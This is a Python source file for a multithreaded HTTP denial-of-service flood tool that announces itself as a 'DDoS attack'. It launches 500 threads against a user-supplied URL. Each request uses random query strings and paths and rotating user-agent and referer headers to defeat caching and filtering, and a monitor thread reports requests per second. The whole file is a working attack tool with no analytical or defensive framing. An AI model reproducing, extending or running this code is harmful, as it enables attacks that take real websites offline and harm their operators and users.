import urllib.request
import urllib.error
import sys
import threading
import random
import re
import time
from headers import get_user_agents, get_referers

url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
    global request_counter
    request_counter+=1

def set_flag(val):
    global flag
    flag=val

def set_safe():
    global safe
    safe=1

def useragent_list():
    global headers_useragents
    headers_useragents = get_user_agents()
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers = get_referers()
    return headers_referers

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 160)
        out_str += chr(a)
    return(out_str)

def usage():
    print('Usage: python ' + sys.argv[0] + ' <url>')
    print('Example: python ' + sys.argv[0] + ' http://www.example.com')

def httpcall(url):
    global request_counter
    useragent_list()
    referer_list()
    
    try:
        # Create multiple request patterns
        patterns = [
            url + '?' + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)),
            url + '/' + buildblock(random.randint(3,10)),
            url + '?' + buildblock(random.randint(3,10)) + '=' + str(random.randint(1,999999))
        ]
        
        request = urllib.request.Request(random.choice(patterns))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Keep-Alive', str(random.randint(110,120)))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host', host)
        request.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        request.add_header('Accept-Language', 'en-US,en;q=0.5')
        request.add_header('Accept-Encoding', 'gzip, deflate')
        
        response = urllib.request.urlopen(request, timeout=3)
        inc_counter()
        return response.getcode()
    except urllib.error.HTTPError as e:
        inc_counter()
    except urllib.error.URLError as e:
        pass
    except Exception as e:
        pass
    return 0

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag<2:
                httpcall(url)
        except:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        try:
            last_counter = 0
            while flag==0:
                time.sleep(1)
                current_counter = request_counter
                req_per_sec = current_counter - last_counter
                last_counter = current_counter
                print(f'[+] Requests: {current_counter} | Rate: {req_per_sec} req/sec')
        except:
            pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
        sys.exit()
    try:
        url = sys.argv[1]
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        # Extract host properly
        host = re.search('https?://([^/]+)', url).group(1)
        
        print('[+] Target:', url)
        print('[+] Host:', host)
        print('[+] Starting DDoS attack...')
        print('[+] Press Ctrl+C to stop')
        
        # Initialize headers
        useragent_list()
        referer_list()
        
        # Increase number of threads for more aggressive attack
        for i in range(500):
            t = HTTPThread()
            t.daemon = True
            t.start()
            
        t = MonitorThread()
        t.daemon = True
        t.start()
        
        while flag==0:
            try:
                input()
            except:
                break
    except KeyboardInterrupt:
        set_flag(2)
        print('\n[+] Attack stopped')
        sys.exit() 